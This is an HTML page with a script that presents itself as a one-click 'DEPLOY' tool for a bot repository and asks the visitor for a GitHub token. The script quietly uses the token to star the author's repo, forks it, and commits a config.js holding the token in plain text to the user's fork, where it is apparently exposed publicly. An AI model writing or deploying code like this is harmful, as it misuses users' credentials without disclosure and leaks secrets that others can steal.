<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>WORKFORCE</title>
  <style>
    body {
      background: #ddd;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .card {
      background: white;
      border-radius: 20px;
      padding: 30px;
      width: 300px;
      box-shadow: 0 5px 20px rgba(0,0,0,0.2);
      text-align: center;
    }

    .card h1 {
      margin-bottom: 20px;
      font-size: 24px;
      font-weight: bold;
    }

    .input-group {
      margin-bottom: 15px;
      text-align: left;
    }

    .input-group label {
      display: block;
      font-size: 14px;
      color: #777;
    }

    .input-group input {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border-radius: 10px;
      border: 1px solid #ccc;
      background: #eee;
    }

    button {
      background-color: #5c6cff;
      color: white;
      font-weight: bold;
      padding: 12px 20px;
      border: none;
      border-radius: 15px;
      cursor: pointer;
      font-size: 16px;
      margin-top: 15px;
    }

    .message {
      margin-top: 15px;
      color: green;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="card">
    <h1>WORKFORCE</h1>
    <div class="input-group">
      <label for="token">GitHub token</label>
      <input type="password" id="token" placeholder="Enter GitHub token"/>
    </div>
    <div class="input-group">
      <label for="name">Your Name</label>
      <input type="text" id="name" placeholder="Enter your name"/>
    </div>
    <button onclick="deploy()">DEPLOY</button>
    <div class="message" id="message"></div>
  </div>

  <script>
    function toBase64(str) {
      return btoa(unescape(encodeURIComponent(str)));
    }

    async function deploy() {
      const token = document.getElementById("token").value;
      const yourName = document.getElementById("name").value;
      const message = document.getElementById("message");
      message.innerText = "Deploying...";

      if (!token || !yourName) {
        message.innerText = "Please enter both fields.";
        return;
      }

      try {
        // Get GitHub username
        const userRes = await fetch("https://api.github.com/user", {
          headers: { Authorization: "token " + token }
        });
        const user = await userRes.json();
        if (!user.login) throw new Error("Invalid token or user fetch failed.");
        const username = user.login;

        // Star the repo
        await fetch("https://api.github.com/user/starred/Kx-Shrii/CLICKER-X-MD", {
          method: "PUT",
          headers: { Authorization: "token " + token }
        });

        // Fork the repo
        const forkRes = await fetch("https://api.github.com/repos/Kx-Shrii/CLICKER-X-MD/forks", {
          method: "POST",
          headers: { Authorization: "token " + token }
        });
        const forkedRepo = await forkRes.json();
        if (!forkedRepo.name) throw new Error("Forking failed.");
        const forkedRepoName = forkedRepo.name;

        // Wait for fork to be ready
        await new Promise(resolve => setTimeout(resolve, 3000));

        // Create config.js content
        const configContent = `
YOUR_NAME = "${yourName}";
GITHUB_USERNAME = "${username}";
GITHUB_TOKEN = "${token}";
`.trim();

        const contentEncoded = toBase64(configContent);
        const uploadUrl = `https://api.github.com/repos/${username}/${forkedRepoName}/contents/config.js`;

        const uploadResponse = await fetch(uploadUrl, {
          method: "PUT",
          headers: {
            Authorization: "token " + token,
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            message: "Add config.js",
            content: contentEncoded
          })
        });

        const uploadData = await uploadResponse.json();
        if (!uploadResponse.ok) {
          throw new Error(`Upload failed: ${uploadData.message}`);
        }

        message.innerText = "Deployment complete!";
      } catch (err) {
        console.error(err);
        message.innerText = "Deployment failed: " + err.message;
      }
    }
  </script>
</body>
</html>
